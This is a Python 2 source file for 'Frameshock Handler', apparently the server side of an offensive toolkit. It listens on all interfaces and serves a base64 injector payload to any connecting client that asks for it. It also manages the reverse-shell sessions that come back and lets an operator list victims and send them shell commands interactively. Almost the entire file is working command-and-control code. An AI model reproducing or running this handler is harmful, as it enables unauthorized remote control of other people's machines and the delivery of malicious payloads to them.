#!/usr/bin/env python2
import socket
from config import config
import struct
import threading
import os
import time
import select

class ThreadFlag(threading.Thread):
      def __init__(self):
          threading.Thread.__init__(self)

      def run(self):
          t = multiHandler()
          t.getConnections()

class ClientThread(threading.Thread, config):

    def __init__(self,ip,port,clientsocket,payloadType):
        self.config = config()
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.csock = clientsocket
        self.payloadType = payloadType
        #print "[+] New thread started for "+ip+":"+str(port)

    def run(self):
        print "**********************************************"
        print "Connection from : "+self.ip+":"+str(self.port)
        print "Sending Payload..."

        path = self.config.getPath();

        injector = open(path+"/Injector/payload.b64").read();
        self.csock.send(struct.pack('>I', len(injector))+injector)
        #print "Client at "+self.ip+" disconnected..."
        print "**********************************************"

class multiHandler(config):
    config = config()
    host = "0.0.0.0"
    port = config.getPort()

    intro ="""
    --------------------------------------------------------------
                         Frameshock Handler
    --------------------------------------------------------------
    """

    commands = """
    ---------
    Commands:
    ---------
    list          | List connections
    interact <id> | Interact with client
    !exit         | Close connection (Inside Session)
    stop          | Stop interacting with Client
    quit          | Close all connections and quit
    help          | Show this message
    \n"""

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.settimeout(1) #this is needed in accept() later on
    s.bind((host,port))
    s.listen(10)
    allConnections = []
    allAddresses = []
    lenAllConections=0

    def __init__(self):
        self.q="";
        self.addr="";
        self.Rport=0;
        self.input=""

    def payloadManager(self,payloadType):
        print "Listening for incoming connections..."
        #pass clientsock to the ClientThread thread object being created
        newthread = ClientThread(self.addr, self.Rport, self.q, payloadType)
        newthread.start()

    def getConnections(self):

        while 1:
            try:
                (self.q, (self.addr, self.Rport))=self.s.accept() #will timeout after 5 seconds
                self.q.setblocking(1) #needed later on in recv() / making an non-blocking socket object
                flagPayload =  ""+self.q.recv(1024)
                flagPayload = flagPayload.strip().replace("\n","")

                if(flagPayload=="GiveMePayload"):
                    self.payloadManager(flagPayload)
                else:
                    print "[INFO] New Conection"
                    self.allConnections.append((self.q,self.addr,self.Rport,flagPayload))
                    if(len(self.allConnections)>self.lenAllConections):
                        self.lenAllConections=len(self.allConnections)
            except:
                    pass
        #start all over

    def main(self):
        print self.intro, self.commands
        self.manageClient()

    def interactClient(self):
        print ""
        while 1:
            self.input=">>"
            command = raw_input("> ")
            if(command == "list"):
                print "--------\nClients:\n--------"
                for item in self.allConnections:
                    print "%d - %s|%s" % (self.allConnections.index(item) + 1, str(item[1]), str(item[2]))
                print "\n"
            elif("interact" in command):
                chosenone = int(command.replace("interact ","")) - 1
                if ((chosenone <= len(self.allConnections)) and (chosenone >= 0 )):
                    print "[INFO] Interacting with %s" % str(self.allConnections[chosenone][1])+":"+str(self.allConnections[chosenone][2])
                    try:
                        flagPayload = self.allConnections[chosenone][3]
                        #print flagPayload[0]
                        #flagPayload = ["",""]
                        #flagPayload[1]="bash"
                        if(flagPayload=="linuxPayload" or '$' in flagPayload or '#' in flagPayload or flagPayload=='sh'):

                            def interact(sock,command):

                                response = ""
                                msg="";
                                sock.send(command + '\n')
                                time.sleep(.5)
                                if not ("cd" in command and flagPayload == "sh"):
                                    ready = select.select([sock], [], [], 2)
                                    if ready[0]:
                                        response = ""+sock.recv(0x10000)
                                if(response!=command):
                                    msg = response.replace(command,'').strip()
                                return msg

                            command=''
                            while True:
                                if(self.input!=">>"):
                                    command=raw_input(self.input+"\n>>")
                                else:
                                    command=raw_input(self.input)
                                if(command=="stop"):
                                    break
                                elif(command=="!exit"):
                                    self.allConnections.remove(self.allConnections[chosenone])
                                    break;
                                else:
                                    self.input = interact(self.allConnections[chosenone][0],command)

                            self.interactClient()

                        else:
                            self.allConnections[chosenone][0].send("hellows123") #welcome message
                            vtpath = self.allConnections[chosenone][0].recv(4096) + ">" #non blocking socket object / will timeout instantly if no data received

                    except:
                        print "[ERROR] Client closed the connection\n"
                        self.allConnections.remove(self.allConnections[chosenone])
                        self.interactClient()
                    while 1:
                        data=raw_input(vtpath) #raw_input represents the client's sub process's current path
                        if ((data != "stop") and (data != "exit") and ("cd " not in data) and ("upload " not in data)):
                            try:
                                self.allConnections[chosenone][0].send(data)
                                msg=self.allConnections[chosenone][0].recv(4096) #non blocking socket object / will timeout instantly if no data received
                                print msg
                            except:
                                print "[ERROR] Client closed the connection\n"
                                self.allConnections.remove(self.allConnections[chosenone])
                                self.interactClient()
                            pass
                        elif ("cd " in data): #dealing with the cd command
                            try:
                                self.allConnections[chosenone][0].send(data)
                                msg=self.allConnections[chosenone][0].recv(4096) #non blocking socket object / will timeout instantly if no data received
                                vtpath = msg + ">"
                            except:
                                print "[ERROR] Client closed the connection\n"
                                self.allConnections.remove(self.allConnections[chosenone])
                                self.interactClient()

                        elif ("exit" in data): #dealing with the cd command
                            try:
                                self.allConnections[chosenone][0].send("exit")
                                self.allConnections[chosenone][0].send("stop")
                                self.allConnections.remove(self.allConnections[chosenone])
                                break
                            except:
                                print "[ERROR] Client closed the connection\n"
                                self.interactClient()

                        else:
                            print "\n"
                            break
                else:
                    print "[ERROR] Client doesn't exist\n"
            elif(command == "quit"):
                for item in self.allConnections:
                    try:
                        item.send("exit") #send a message that will close the client connection
                        item.close() #close socket objects
                    except:
                        print "[ERROR] %s closed the connection already\n" % item
                self.s.close()
                os._exit(0)
                break;
            elif(command == "help"):
                print self.commands
            else:
                print "[ERROR] Invalid Command\n"

    def manageClient(self):
        t = ThreadFlag()
        t.start()
        self.interactClient()

start = multiHandler()
start.main()